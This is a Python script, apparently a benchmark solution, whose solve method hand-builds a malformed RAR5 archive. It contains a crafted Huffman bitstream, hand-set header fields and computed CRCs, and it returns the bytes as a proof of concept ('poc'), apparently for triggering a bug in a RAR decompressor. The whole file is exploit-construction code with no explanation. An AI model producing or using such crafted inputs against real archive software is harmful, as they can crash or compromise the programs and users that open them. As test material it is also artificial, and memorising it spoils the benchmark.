import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def vint(n: int) -> bytes:
            res = bytearray()
            if n == 0:
                return b'\x00'
            while n > 0:
                b = n & 0x7f
                n >>= 7
                if n > 0:
                    b |= 0x80
                res.append(b)
            return bytes(res)

        class BitStreamWriter:
            def __init__(self):
                self.buf = bytearray()
                self.bit_pos = 0

            def write(self, bits: int, num: int):
                val = bits
                for _ in range(num):
                    if self.bit_pos % 8 == 0:
                        self.buf.append(0)
                    if (val & 1):
                        self.buf[-1] |= (1 << (self.bit_pos % 8))
                    val >>= 1
                    self.bit_pos += 1
            
            def write_bytes_aligned(self, data: bytes):
                while self.bit_pos % 8 != 0:
                    self.write(0, 1)
                self.buf.extend(data)
                self.bit_pos += len(data) * 8

            def get_data(self) -> bytes:
                return bytes(self.buf)

        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        bsw = BitStreamWriter()
        
        bsw.write(0, 1)
        bsw.write(1, 1)
        bsw.write(0, 1)
        bsw.write(0, 1)
        bsw.write(0, 1)

        bsw.write(0b00, 2)
        bsw.write(1, 4)

        bsw.write(0b10, 2)

        bsw.write(1, 1)
        bsw.write(1, 1)
        
        bsw.write_bytes_aligned(vint(469))

        huffman_bitstream = bsw.get_data()
        
        block_header = vint(0x01)
        packed_data = block_header + huffman_bitstream

        packed_size = len(packed_data)

        fields = bytearray()
        fields += vint(2)
        fields += vint(0x4024)
        fields += vint(packed_size)
        fields += vint(1)
        fields += vint(0x20)
        fields += b'\x00\x00\x00\x00'
        fields += vint(0)
        fields += vint(2)
        fields += vint(len("a"))
        fields += b"a"

        header_size = vint(len(fields))
        crc_data = header_size + fields
        header_crc = struct.pack('<I', zlib.crc32(crc_data))

        file_header = header_crc + header_size + fields

        end_fields = bytearray()
        end_fields += vint(5)
        end_fields += vint(0x01)
        
        end_header_size = vint(len(end_fields))
        end_crc_data = end_header_size + end_fields
        end_header_crc = struct.pack('<I', zlib.crc32(end_crc_data))
        end_header = end_header_crc + end_header_size + end_fields
        
        poc = sig + file_header + packed_data + end_header

        return poc
